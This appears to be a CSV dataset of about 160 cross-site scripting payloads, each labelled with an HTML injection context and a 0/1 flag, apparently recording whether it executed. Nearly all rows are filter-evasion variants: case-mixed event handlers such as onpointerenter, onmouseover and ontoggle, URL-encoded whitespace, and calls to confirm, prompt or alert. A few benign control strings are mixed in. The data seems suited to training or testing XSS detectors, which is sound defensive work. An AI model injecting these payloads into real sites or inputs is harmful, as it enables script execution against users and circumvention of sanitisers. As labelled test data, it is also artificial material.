payload,context,exec,combined
<d3V%09OnpOINteREnTeR%09=%09[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <d3V%09OnpOINteREnTeR%09=%09[8].find(confirm)>v3dm0s
<DETAiLS%0dONtOggle%09=%09(confirm)()%0dx//,html_text,0,CONTEXT_html_text <DETAiLS%0dONtOggle%09=%09(confirm)()%0dx//
<d3v/+/OnpoiNTeREnTeR%0a=%0a(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v/+/OnpoiNTeREnTeR%0a=%0a(prompt)``>v3dm0s
<HtmL%0aoNMOuSEoveR%0a=%0a[8].find(confirm)>,html_tag,0,CONTEXT_html_tag <HtmL%0aoNMOuSEoveR%0a=%0a[8].find(confirm)>
<d3v/+/oNPOiNtErENtEr%09=%09[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <d3v/+/oNPOiNtErENtEr%09=%09[8].find(confirm)>v3dm0s
<a/+/OnPOINterEnTer%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/OnPOINterEnTer%09=%09(prompt)``%0dx>v3dm0s
<A/+/onPoIntEREnTeR%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/onPoIntEREnTeR%0a=%0aconfirm()>v3dm0s
<htmL/+/OnMOuseoVER%0d=%0d(confirm)()>,html_tag,0,CONTEXT_html_tag <htmL/+/OnMOuseoVER%0d=%0d(confirm)()>
<dETaIls%0dONpOInTereNter%0a=%0a(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <dETaIls%0dONpOInTereNter%0a=%0a(confirm)()%0dx//
<DetAils%0aOnPoINTERenTer+=+[8].find(confirm)>,html_tag,0,CONTEXT_html_tag <DetAils%0aOnPoINTERenTer+=+[8].find(confirm)>
<d3v/+/ONPoINTereNTer%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v/+/ONPoINTereNTer%09=%09[8].find(confirm)%0dx>v3dm0s
<A/+/oNMOUSEOVer%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/oNMOUSEOVer%09=%09[8].find(confirm)>v3dm0s
"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",html_tag,1,"CONTEXT_html_tag <iframe srcdoc=""<img src=x onerror=alert(1)>"">"
<D3V/+/ONpOintereNter+=+(confirm)()>v3dm0s,html_tag,0,CONTEXT_html_tag <D3V/+/ONpOintereNter+=+(confirm)()>v3dm0s
<D3V/+/onMoUSEOVER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V/+/onMoUSEOVER%0d=%0dconfirm()%0dx>v3dm0s
<deTails/+/oNTOGgle%0a=%0a(confirm)()>,html_text,1,CONTEXT_html_text <deTails/+/oNTOGgle%0a=%0a(confirm)()>
"<a%0aONpOIntEreNteR%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <a%0aONpOIntEreNteR%0d=%0da=prompt,a()>v3dm0s"
<d3v%0aoNpOInTErEnTEr%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%0aoNpOInTErEnTEr%0d=%0d[8].find(confirm)>v3dm0s
<D3V%09OnpOINTErENtER%0a=%0a(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%09OnpOINTErENtER%0a=%0a(confirm)()>v3dm0s
<A/+/OnmoUSEovEr%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <A/+/OnmoUSEovEr%0a=%0aconfirm()>v3dm0s
<D3v%0aOnpoiNtErENTeR%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0aOnpoiNtErENTeR%0d=%0d[8].find(confirm)%0dx>v3dm0s
<D3V/+/OnmoUSeoVer%09=%09(confirm)()>v3dm0s,html_attribute,0,CONTEXT_html_attribute <D3V/+/OnmoUSeoVer%09=%09(confirm)()>v3dm0s
<A%0dOnmOuseOveR%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <A%0dOnmOuseOveR%0d=%0dconfirm()>v3dm0s
<HTml/+/OnmousEoVeR+=+confirm()//,html_tag,0,CONTEXT_html_tag <HTml/+/OnmousEoVeR+=+confirm()//
<script>\u0061lert(1)</script>,html_tag,1,CONTEXT_html_tag <script>\u0061lert(1)</script>
"<htmL%0dONmoUsEOveR%09=%09a=prompt,a()>",html_tag,0,"CONTEXT_html_tag <htmL%0dONmoUsEOveR%09=%09a=prompt,a()>"
<deTailS%0dONpoINTeReNteR%09=%09confirm()>,html_text,0,CONTEXT_html_text <deTailS%0dONpoINTeReNteR%09=%09confirm()>
<IMG SRC=x ONERROR=alert(1)>,html_text,0,CONTEXT_html_text <IMG SRC=x ONERROR=alert(1)>
<A%0dONMouSeOVer%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <A%0dONMouSeOVer%0a=%0a[8].find(confirm)>v3dm0s
"<d3v/+/ONMouSeover+=+a=prompt,a()>v3dm0s",html_text,0,"CONTEXT_html_text <d3v/+/ONMouSeover+=+a=prompt,a()>v3dm0s"
<a%0dOnPoinTeREntER%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0dOnPoinTeREntER%09=%09confirm()%0dx>v3dm0s
<DetAils/+/oNTOggLe%0a=%0a(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <DetAils/+/oNTOggLe%0a=%0a(confirm)()%0dx//
<d3V%0aONpoinTERenter%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0aONpoinTERenter%09=%09confirm()%0dx>v3dm0s
<D3v%0doNMOuSEovER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0doNMOuSEovER%0d=%0dconfirm()%0dx>v3dm0s
<A%0dONpoInTerEnTer+=+confirm()>v3dm0s,html_tag,0,CONTEXT_html_tag <A%0dONpoInTerEnTer+=+confirm()>v3dm0s
<d3v%09oNMOUsEOVer%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <d3v%09oNMOUsEOVer%09=%09confirm()>v3dm0s
<DeTaiLs%0dONTOGgLe%09=%09[8].find(confirm)>,html_text,0,CONTEXT_html_text <DeTaiLs%0dONTOGgLe%09=%09[8].find(confirm)>
<dETAiLs%0aONToggle%0a=%0aconfirm()//,html_text,0,CONTEXT_html_text <dETAiLs%0aONToggle%0a=%0aconfirm()//
<a%0donMoUSeOVer+=+[8].find(confirm)>v3dm0s,html_text,0,CONTEXT_html_text <a%0donMoUSeOVer+=+[8].find(confirm)>v3dm0s
<a%0doNpOiNTerentEr%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0doNpOiNTerentEr%0d=%0dconfirm()%0dx>v3dm0s
<A/+/OnPOINTeRenTEr%09=%09(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/OnPOINTeRenTEr%09=%09(confirm)()>v3dm0s
<HTmL%0dONmOuSEOveR%0a=%0aconfirm()%0dx>,html_tag,0,CONTEXT_html_tag <HTmL%0dONmOuSEOveR%0a=%0aconfirm()%0dx>
<d3V%0dONmOuSeOver%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0dONmOuSeOver%0a=%0a[8].find(confirm)%0dx>v3dm0s
<A%0aonMOUSeOVEr%0d=%0d(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aonMOUSeOVEr%0d=%0d(confirm)()>v3dm0s
<a%0dOnpointerenTEr%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0dOnpointerenTEr%0d=%0d(prompt)``%0dx>v3dm0s
<a/+/oNmoUSeovER%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <a/+/oNmoUSeovER%09=%09confirm()>v3dm0s
<A%09onMoUsEOVER%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%09onMoUsEOVER%09=%09confirm()%0dx>v3dm0s
<dETAILS%09onTOGglE%0d=%0d(prompt)``//,html_tag,0,CONTEXT_html_tag <dETAILS%09onTOGglE%0d=%0d(prompt)``//
<D3v%0dOnMOUSeOveR+=+(prompt)``>v3dm0s,html_tag,0,CONTEXT_html_tag <D3v%0dOnMOUSeOveR+=+(prompt)``>v3dm0s
<htML/+/oNpOintErEnter%09=%09confirm()%0dx//,html_tag,0,CONTEXT_html_tag <htML/+/oNpOintErEnter%09=%09confirm()%0dx//
<d3v%09OnpoiNteRentER%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <d3v%09OnpoiNteRentER%0d=%0dconfirm()>v3dm0s
<D3V%0aonmoUsEOver+=+[8].find(confirm)%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <D3V%0aonmoUsEOver+=+[8].find(confirm)%0dx>v3dm0s
<htMl%0aonpOInTEREnteR%0d=%0dconfirm()%0dx//,html_tag,0,CONTEXT_html_tag <htMl%0aonpOInTEREnteR%0d=%0dconfirm()%0dx//
<D3V%0dOnMOusEOvEr%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0dOnMOusEOvEr%0d=%0dconfirm()>v3dm0s
<D3v%0aOnpOIntereNTEr%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0aOnpOIntereNTEr%0d=%0d(confirm)()%0dx>v3dm0s
<D3V/+/onPointerEnteR%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V/+/onPointerEnteR%0d=%0dconfirm()%0dx>v3dm0s
<D3V%09OnmOUsEoVEr%09=%09[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <D3V%09OnmOUsEoVEr%09=%09[8].find(confirm)>v3dm0s
<hTmL%0aONpoIntEREntER%09=%09confirm()%0dx>,html_text,0,CONTEXT_html_text <hTmL%0aONpoIntEREntER%09=%09confirm()%0dx>
<A%0doNMoUSeoVER%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0doNMoUSeoVER%09=%09[8].find(confirm)>v3dm0s
"<A%0aoNmouSEOvEr%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%0aoNmouSEOvEr%0d=%0da=prompt,a()>v3dm0s"
<dETaiLs/+/OnpoInTeRenTEr%09=%09(prompt)``%0dx>,html_tag,0,CONTEXT_html_tag <dETaiLs/+/OnpoInTeRenTEr%09=%09(prompt)``%0dx>
<d3V%0aONPointeRENtER%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0aONPointeRENtER%0d=%0dconfirm()>v3dm0s
<dETAiLS%0donPointErenTER%0a=%0a(prompt)``%0dx//,html_tag,0,CONTEXT_html_tag <dETAiLS%0donPointErenTER%0a=%0a(prompt)``%0dx//
<d3V%09ONmouseover+=+confirm()%0dx>v3dm0s,html_text,0,CONTEXT_html_text <d3V%09ONmouseover+=+confirm()%0dx>v3dm0s
"<D3v%0aONPOiNtErEnTer%0d=%0da=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <D3v%0aONPOiNtErEnTer%0d=%0da=prompt,a()%0dx>v3dm0s"
"<d3V%0aONpoInteRENTER%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <d3V%0aONpoInteRENTER%0a=%0aa=prompt,a()%0dx>v3dm0s"
textonly,html_text,0,CONTEXT_html_text textonly
<d3V%0aOnmOUSeOvEr%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0aOnmOUSeOvEr%0d=%0d[8].find(confirm)%0dx>v3dm0s
<DEtaIlS/+/OnPOINtERentER%0a=%0aconfirm()//,html_text,0,CONTEXT_html_text <DEtaIlS/+/OnPOINtERentER%0a=%0aconfirm()//
<A/+/ONPoINTEreNTeR%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/ONPoINTEreNTeR%09=%09confirm()>v3dm0s
"<A%0aonMoUseOVeR%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%0aonMoUseOVeR%0a=%0aa=prompt,a()%0dx>v3dm0s"
<A%0donpoiNTErENtEr%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <A%0donpoiNTErENtEr%0d=%0d[8].find(confirm)>v3dm0s
<a%0aOnMOuSEoVEr%0a=%0a(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aOnMOuSEoVEr%0a=%0a(confirm)()%0dx>v3dm0s
<d3v/+/oNpOInTeReNtEr%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v/+/oNpOInTeReNtEr%09=%09(prompt)``%0dx>v3dm0s
<a/+/ONMOuseoVEr%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/ONMOuseoVEr%0d=%0dconfirm()%0dx>v3dm0s
<HTML%0dOnMoUseOver%09=%09confirm()//,html_text,0,CONTEXT_html_text <HTML%0dOnMoUseOver%09=%09confirm()//
<d3V/+/ONmOUseOver%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V/+/ONmOUseOver%0a=%0aconfirm()%0dx>v3dm0s
"<a%0dONPoInTeREntER%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <a%0dONPoInTeREntER%0d=%0da=prompt,a()>v3dm0s"
<detaIlS/+/ontoGGle+=+[8].find(confirm)>,html_tag,0,CONTEXT_html_tag <detaIlS/+/ontoGGle+=+[8].find(confirm)>
<A/+/OnMOUsEOVER%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <A/+/OnMOUsEOVER%0a=%0a[8].find(confirm)>v3dm0s
"<DEtaILS%0dontOGgle%0a=%0aa=prompt,a()%0dx>",html_tag,0,"CONTEXT_html_tag <DEtaILS%0dontOGgle%0a=%0aa=prompt,a()%0dx>"
"<dETaiLS%09ontOGGle+=+a=prompt,a()>",html_tag,0,"CONTEXT_html_tag <dETaiLS%09ontOGGle+=+a=prompt,a()>"
<a%0dONmOuSEoVeR%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <a%0dONmOuSEoVeR%09=%09confirm()>v3dm0s
<A%0donmousEover+=+(confirm)()%0dx>v3dm0s,html_text,0,CONTEXT_html_text <A%0donmousEover+=+(confirm)()%0dx>v3dm0s
<d3V%09onmOUsEOVER%09=%09(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%09onmOUsEOVER%09=%09(prompt)``>v3dm0s
<notatag,html_text,0,CONTEXT_html_text <notatag
<a%09oNpoiNteRenTER%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09oNpoiNteRenTER%0a=%0a[8].find(confirm)%0dx>v3dm0s
"<a%0aonMOUsEOVeR%09=%09a=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <a%0aonMOUsEOVeR%09=%09a=prompt,a()>v3dm0s"
"<a%0doNMOuseOVEr%0a=%0aa=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <a%0doNMOuseOVEr%0a=%0aa=prompt,a()>v3dm0s"
<D3v%09onmoUseOVER%0d=%0d(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%09onmoUseOVER%0d=%0d(confirm)()>v3dm0s
"<D3V%09onpOINterENTer%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <D3V%09onpOINterENTer%09=%09a=prompt,a()%0dx>v3dm0s"
<d3v%09oNpoiNTerEnTeR%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%09oNpoiNTerEnTeR%09=%09confirm()>v3dm0s
<hTMl%0dONPoInTerEnteR%0d=%0d(confirm)()>,html_tag,0,CONTEXT_html_tag <hTMl%0dONPoInTerEnteR%0d=%0d(confirm)()>
<D3v%09OnPointeReNteR%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%09OnPointeReNteR%0d=%0d(prompt)``%0dx>v3dm0s
<d3v/+/ONpoINtErenTer%09=%09(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v/+/ONpoINtErenTer%09=%09(confirm)()>v3dm0s
"<A%0aOnpoINTErEnTER+=+a=prompt,a()%0dx>v3dm0s",html_tag,0,"CONTEXT_html_tag <A%0aOnpoINTErEnTER+=+a=prompt,a()%0dx>v3dm0s"
<a%09ONmoUsEoVeR%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <a%09ONmoUsEoVeR%0a=%0a[8].find(confirm)>v3dm0s
<<>>,html_text,0,CONTEXT_html_text <<>>
"<DetAILs%0aONToggle%0d=%0da=prompt,a()//",html_tag,0,"CONTEXT_html_tag <DetAILs%0aONToggle%0d=%0da=prompt,a()//"
"<detAIlS%09ONpOIntEREnTER%09=%09a=prompt,a()>",html_tag,0,"CONTEXT_html_tag <detAIlS%09ONpOIntEREnTER%09=%09a=prompt,a()>"
"<hTmL/+/ONmOUSEoVeR%0a=%0aa=prompt,a()%0dx//",html_text,0,"CONTEXT_html_text <hTmL/+/ONmOUSEoVeR%0a=%0aa=prompt,a()%0dx//"
<HtML%09OnmouseOVER%0a=%0aconfirm()%0dx>,html_tag,0,CONTEXT_html_tag <HtML%09OnmouseOVER%0a=%0aconfirm()%0dx>
<A%0donPOINTerENTEr%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <A%0donPOINTerENTEr%0d=%0dconfirm()>v3dm0s
<A%09ONmOUSEovER+=+confirm()>v3dm0s,html_text,0,CONTEXT_html_text <A%09ONmOUSEovER+=+confirm()>v3dm0s
"<D3v%09ONpOiNTeREntER%09=%09a=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <D3v%09ONpOiNTeREntER%09=%09a=prompt,a()>v3dm0s"
<HTMl%0donmousEoVER%0a=%0aconfirm()%0dx//,html_tag,0,CONTEXT_html_tag <HTMl%0donmousEoVER%0a=%0aconfirm()%0dx//
<a%0aonpoInTerEntER%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aonpoInTerEntER%0a=%0a(prompt)``%0dx>v3dm0s
<D3v%09onPoinTeRENteR%0a=%0a(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%09onPoinTeRENteR%0a=%0a(confirm)()%0dx>v3dm0s
"<deTailS/+/OntOGGlE+=+a=prompt,a()>",html_tag,0,"CONTEXT_html_tag <deTailS/+/OntOGGlE+=+a=prompt,a()>"
<dETaiLS%0aonpointErENTER%09=%09(prompt)``%0dx>,html_text,0,CONTEXT_html_text <dETaiLS%0aonpointErENTER%09=%09(prompt)``%0dx>
"""><svg/onload=alert(1)>",html_tag,1,"CONTEXT_html_tag ""><svg/onload=alert(1)>"
"<A%09OnmOUSEOver%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <A%09OnmOUSEOver%0d=%0da=prompt,a()>v3dm0s"
"<d3v/+/oNPOiNTeRenTer+=+a=prompt,a()>v3dm0s",html_text,0,"CONTEXT_html_text <d3v/+/oNPOiNTeRenTer+=+a=prompt,a()>v3dm0s"
"<d3V%0doNPOInTerEnter%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <d3V%0doNPOInTerEnter%0a=%0aa=prompt,a()%0dx>v3dm0s"
""";alert(window.origin);//",html_tag,0,"CONTEXT_html_tag "";alert(window.origin);//"
<d3v%0doNMoUseovER%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0doNMoUseovER%0d=%0dconfirm()%0dx>v3dm0s
<d3v%0aONPoiNTeRentEr%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0aONPoiNTeRentEr%0a=%0a[8].find(confirm)>v3dm0s
<HtMl/+/OnPoINTErEnTER+=+[8].find(confirm)%0dx//,html_text,0,CONTEXT_html_text <HtMl/+/OnPoINTErEnTER+=+[8].find(confirm)%0dx//
<d3v%09ONmOuseovEr%0d=%0d(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <d3v%09ONmOuseovEr%0d=%0d(confirm)()>v3dm0s
<a%0aonPOintEreNtER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aonPOintEreNtER%0d=%0dconfirm()%0dx>v3dm0s
<A%0aONmOUSEOvEr%0d=%0d(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aONmOUSEOvEr%0d=%0d(prompt)``>v3dm0s
<DETails/+/onTOgGLE+=+[8].find(confirm)%0dx//,html_text,0,CONTEXT_html_text <DETails/+/onTOgGLE+=+[8].find(confirm)%0dx//
<HtML/+/oNpOIntErenteR%0a=%0a(confirm)()//,html_text,0,CONTEXT_html_text <HtML/+/oNpOIntErenteR%0a=%0a(confirm)()//
<A/+/onmOUseOVEr+=+(prompt)``%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <A/+/onmOUseOVEr+=+(prompt)``%0dx>v3dm0s
<DetAils%0aONToGGlE%0a=%0a(prompt)``%0dx>,html_tag,0,CONTEXT_html_tag <DetAils%0aONToGGlE%0a=%0a(prompt)``%0dx>
<dETAIlS%0aonpOInTereNTer%0a=%0a(confirm)()>,html_tag,0,CONTEXT_html_tag <dETAIlS%0aonpOInTereNTer%0a=%0a(confirm)()>
<A%0aOnmoUseoVeR%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aOnmoUseoVeR%0d=%0d(confirm)()%0dx>v3dm0s
<A%0dOnpOinTErEnTer%0a=%0a(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0dOnpOinTErEnTer%0a=%0a(confirm)()%0dx>v3dm0s
<DeTAilS%0aOntogGlE%09=%09(confirm)()>,html_tag,0,CONTEXT_html_tag <DeTAilS%0aOntogGlE%09=%09(confirm)()>
<HTmL%0aONmOuSeOVer%0d=%0d(prompt)``>,html_tag,0,CONTEXT_html_tag <HTmL%0aONmOuSeOVer%0d=%0d(prompt)``>
<Html/+/onPoiNTEReNTEr+=+confirm()//,html_tag,0,CONTEXT_html_tag <Html/+/onPoiNTEReNTEr+=+confirm()//
<detailS%09OnpoINterEnTEr+=+(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <detailS%09OnpoINterEnTEr+=+(confirm)()%0dx//
<d3V%0dOnmouseovEr%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0dOnmouseovEr%0d=%0dconfirm()%0dx>v3dm0s
<D3V%0aoNMouSEoVer%09=%09(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0aoNMouSEoVer%09=%09(confirm)()>v3dm0s
<D3V%0aonPointeReNTEr%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0aonPointeReNTEr%09=%09confirm()>v3dm0s
<Html%09oNmoUSeOver%0d=%0d(prompt)``%0dx//,html_tag,0,CONTEXT_html_tag <Html%09oNmoUSeOver%0d=%0d(prompt)``%0dx//
"<A/+/onMouseovEr%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <A/+/onMouseovEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
<DETAiLs%09ONtoGgLe%0d=%0d(confirm)()%0dx//,html_text,0,CONTEXT_html_text <DETAiLs%09ONtoGgLe%0d=%0d(confirm)()%0dx//
<HTMl/+/ONMousEOVeR%09=%09(confirm)()>,html_tag,0,CONTEXT_html_tag <HTMl/+/ONMousEOVeR%09=%09(confirm)()>
&#x3C;iframe&#x3E;,html_text,0,CONTEXT_html_text &#x3C;iframe&#x3E;
<script>alert(document.domain)</script>,html_tag,1,CONTEXT_html_tag <script>alert(document.domain)</script>
<D3v/+/ONpoInteRenteR+=+confirm()>v3dm0s,html_tag,0,CONTEXT_html_tag <D3v/+/ONpoInteRenteR+=+confirm()>v3dm0s
<A%0aoNMousEover%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aoNMousEover%0d=%0dconfirm()%0dx>v3dm0s
<D3v/+/ONpoiNTErENTeR%09=%09(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <D3v/+/ONpoiNTErENTeR%09=%09(confirm)()>v3dm0s
<a%0doNmoUSeOVer%0a=%0a(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0doNmoUSeOVer%0a=%0a(confirm)()%0dx>v3dm0s
<a/+/ONpOINtERENtER%0d=%0d(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/ONpOINtERENtER%0d=%0d(confirm)()>v3dm0s
</img>,html_text,0,CONTEXT_html_text </img>
<d3v%0aoNMOuseoVeR%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0aoNMOuseoVeR%0a=%0a[8].find(confirm)%0dx>v3dm0s
"<a/+/onpoiNTERENTER%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <a/+/onpoiNTERENTER%0a=%0aa=prompt,a()%0dx>v3dm0s"
"<A/+/ONPOiNTErEnTER%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <A/+/ONPOiNTErEnTER%09=%09a=prompt,a()%0dx>v3dm0s"
<a%0doNmoUSeoVEr%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0doNmoUSeoVEr%0d=%0d(prompt)``%0dx>v3dm0s
<HtML%0aOnPoiNtereNtER%09=%09confirm()>,html_text,0,CONTEXT_html_text <HtML%0aOnPoiNtereNtER%09=%09confirm()>
<html/+/OnPOiNTErENtEr%0d=%0dconfirm()//,script_block,0,CONTEXT_script_block <html/+/OnPOiNTErENtEr%0d=%0dconfirm()//
<deTAilS%0dOnPoINTErEnTer%0a=%0a(prompt)``//,html_tag,0,CONTEXT_html_tag <deTAilS%0dOnPoINTErEnTer%0a=%0a(prompt)``//
<A%09ONpOintErentER%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <A%09ONpOintErentER%0d=%0dconfirm()>v3dm0s
<a/+/oNPoINtERENteR%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/oNPoINtERENteR%09=%09[8].find(confirm)>v3dm0s
<a/+/OnpoinTerENTeR%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/OnpoinTerENTeR%0d=%0dconfirm()>v3dm0s
<d3v%0aONMOuseOvEr%09=%09(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0aONMOuseOvEr%09=%09(prompt)``>v3dm0s
<A/+/oNMOUSEOVer%09=%09[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <A/+/oNMOUSEOVer%09=%09[8].find(confirm)>v3dm0s
"<D3v%0aONPOinteRenTer%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <D3v%0aONPOinteRenTer%0d=%0da=prompt,a()>v3dm0s"
<D3V%0donmOuSeOveR%09=%09(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0donmOuSeOveR%09=%09(prompt)``>v3dm0s
<A%09oNMOUsEOvER%09=%09[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <A%09oNMOUsEOvER%09=%09[8].find(confirm)>v3dm0s
